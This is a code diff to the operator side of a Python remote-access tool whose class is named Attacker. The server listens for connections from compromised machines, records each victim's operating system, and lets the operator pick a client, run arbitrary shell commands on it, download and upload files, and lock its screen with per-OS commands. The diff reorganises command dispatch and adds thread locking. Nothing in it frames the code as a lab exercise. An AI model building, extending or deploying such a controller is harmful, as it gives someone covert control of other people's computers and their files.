@@ -5,6 +5,7 @@ from queue import Queue
 import os
 import select
 
+import time
 MAX_BYTES = 1024
 class Attacker:
     def __init__(self, ip, port) -> None:
@@ -14,6 +15,27 @@ class Attacker:
         self.connected_clients = {}
         self.active_client = None
         self.queue = Queue()
+        self.lock = threading.Lock()
+        self.cmd_func_mapping = self.command_function_pair()
+        self.user_func_mapping = self.user_function_pair()
+
+
+    def user_function_pair(self):
+        return {
+            "list": self.list_connections, 
+            "help": self.help_menu, 
+            "exit": self.exit_program,
+            "select": self.select_client
+        }
+    
+
+    def command_function_pair(self):
+        return {
+            "lock": self.lock_screen, 
+            "download": self.download_file, 
+            "upload": self.upload_file, 
+            "exit": self.exit_client
+        }
 
 
     def start_server(self):
@@ -31,14 +53,16 @@ class Attacker:
         while True:
             client, address = self.server_socket.accept()
             print(F'\n[+] Connection established from: {address}')
-            self.connected_clients[str(len(self.connected_clients)+1)] = (client, address)
+            platform = client.recv(MAX_BYTES).decode()
+            with self.lock:
+                self.connected_clients[str(len(self.connected_clients)+1)] = (client, address, platform)
 
 
-    def list_connections(self):
+    def list_connections(self, cmd):
         if self.connected_clients:
             print("---- Connected clients ----")    
             for index, connection in enumerate(self.connected_clients.values()):
-                address = F"{connection[1][0]}:{connection[1][1]}"
+                address = F"{connection[1][0]}:{connection[1][1]} - target OS: {connection[2]}"
                 print(F"{index+1}. {address}")
             print()
             return
@@ -53,15 +77,22 @@ class Attacker:
     def exit_client(self, client, cmd):
         client.send(b"exit")
         client.close()
-        del self.connected_clients[self.active_client]
+        with self.lock:
+            del self.connected_clients[self.active_client]
+        return True
 
 
-    @staticmethod
-    def lock_screen(client, cmd):
+    def lock_screen(self, client, cmd):
         """ Lock remote machine screen """
-        client.send('lock'.encode())
-        print(client.recv(MAX_BYTES).decode())
-
+        cmd_platform = {"linux": "xdg-screensaver lock", "win32": "Rundll32.exe user32.dll,LockWorkStation", "darwin": "pmset displaysleepnow"}
+        _, _, os_type = self.connected_clients[self.active_client]
+        platform = cmd_platform.get(os_type, None)
+        if platform:
+            client.send(platform.encode())
+            print(client.recv(MAX_BYTES).decode())
+        else:
+            print(F"Target OS: {os_type} does not support screen locking")
+        
 
     @staticmethod
     def download_file(client, cmd):
@@ -102,7 +133,7 @@ class Attacker:
                 client_ack = client.recv(MAX_BYTES).decode()
                 if "ack" == client_ack: # start sending file's data
                     while True:
-                        file_content = fd.read(1024)
+                        file_content = fd.read(MAX_BYTES)
                         if not file_content:
                             print(F"[+] File: {src_file} was uploaded successfully")
                             break
@@ -114,26 +145,19 @@ class Attacker:
            
 
     def client_interaction(self, client):
-        cmd_func_mapping = {"lock": self.lock_screen, 
-                            "download": self.download_file, 
-                            "upload": self.upload_file, 
-                            "exit": self.exit_client,
-                            }
-        
-        conn, addr = client
+        conn, addr, _ = client
         address = F"{addr[0]}:{addr[1]}"
         while True:
             cmd = input(F"{address} -> ".strip())
             if len(cmd.strip()) == 0:
                 continue
-            elif cmd in ("quit", "exit"):
-                break
             split_user_data = cmd.split(" ")
-            func = cmd_func_mapping.get(split_user_data[0], None)
+            func = self.cmd_func_mapping.get(split_user_data[0], None)
             if func:
-                func(conn, split_user_data)
+                if func(conn, split_user_data):
+                    break
                 continue
-            shell_cmd_thread = threading.Thread(target=self.shell_data, args=(conn, cmd), daemon=True)
+            shell_cmd_thread = threading.Thread(target=self.shell_data, args=(conn, cmd))
             shell_cmd_thread.start()
 
 
@@ -151,7 +175,7 @@ class Attacker:
 
 
     @staticmethod
-    def help_menu():
+    def help_menu(cmd):
         print("""
         User commands: 
         1. list -> list connections
@@ -167,25 +191,33 @@ class Attacker:
         """)
 
 
+    @staticmethod
+    def exit_program(cmd):
+        return True
+    
+
+    def select_client(self, cmd):
+        if len(cmd) == 2:
+            _, client_id = cmd
+            client = self.get_client(client_id)
+            if client:
+                self.active_client = client_id
+                self.client_interaction(client)
+        else:
+            print("please specify valid client id")
+
+
     def handle_interaction(self):
-        user_func_mapping = {"list": self.list_connections, "help": self.help_menu}
         while True:
             prompt = input("$ ")
             if len(prompt.strip()) == 0:
                 continue
-            user_func = user_func_mapping.get(prompt, None)
+            cmd = prompt.split()
+            user_func = self.user_func_mapping.get(cmd[0], None)
             if user_func:
-                user_func()
+                if user_func(cmd):
+                    break
                 continue
-            elif prompt.startswith("select "):
-                client_id = prompt[7:]
-                client = self.get_client(client_id)
-                if client:
-                    self.active_client = client_id
-                    self.client_interaction(client)
-                continue
-            elif prompt == "exit":
-                break
             else:
                 print("[-] Invalid command...")
             
@@ -210,11 +242,12 @@ class Attacker:
         self.queue.task_done()
 
 
-    def flush_clients_conn(self):
-        for client in self.connected_clients.values():
-            conn = client[0]
-            conn.send(b"exit")
-            conn.close()
+    def flush_clients_conn(self):   
+        with self.lock: 
+            for client in self.connected_clients.values():
+                conn, _, _ = client
+                conn.send(b"exit")
+                conn.close()
 
 
     def close_server(self):
